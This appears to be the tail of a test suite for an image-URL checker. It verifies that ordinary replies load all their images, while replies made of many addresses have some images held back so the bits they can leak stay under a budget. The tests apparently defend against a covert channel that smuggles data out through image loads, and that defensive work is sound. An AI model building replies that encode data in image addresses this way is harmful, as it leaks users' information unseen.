    `image reply corpus: ${ordinary.length} ordinary replies (${ordinary.reduce((sum, reply) => sum + reply.srcs.length, 0)} images), ` +
      `${ordinary.filter((reply) => reply.held.length > 0).length} with an image waiting; ` +
      `${data.length} replies of many addresses (${data.reduce((sum, reply) => sum + reply.srcs.length, 0)} images), ` +
      `${data.filter((reply) => reply.held.length === 0).length} with nothing waiting\n` +
      data.map((reply) => `  ${reply.name}: ${reply.srcs.length - reply.held.length} of ${reply.srcs.length} load`).join("\n"),
  );

  test("in an ordinary reply every image loads on its own and none waits", () => {
    expect(ordinary.flatMap((reply) => reply.srcs).filter((src) => imageUrlVerdict(src).kind !== "load").map(describeVerdict)).toEqual([]);
    expect(ordinary.filter((reply) => reply.held.length > 0).map((reply) => `${reply.name}: ${reply.held.length} of ${reply.srcs.length} wait`)).toEqual([]);
  });

  test("the replies of many addresses are made of addresses that each load on their own", () => {
    expect(data.flatMap((reply) => reply.srcs).filter((src) => imageUrlVerdict(src).kind !== "load").map(describeVerdict)).toEqual([]);
  });

  test("in a reply of many such addresses some wait, and what loads stays within the reply's budget", () => {
    expect(data.filter((reply) => reply.held.length === 0).map((reply) => reply.name)).toEqual([]);
    expect(data.filter((reply) => reply.silent > REPLY_BIT_BUDGET).map((reply) => `${reply.name}: ${reply.silent} bits`)).toEqual([]);
  });
});
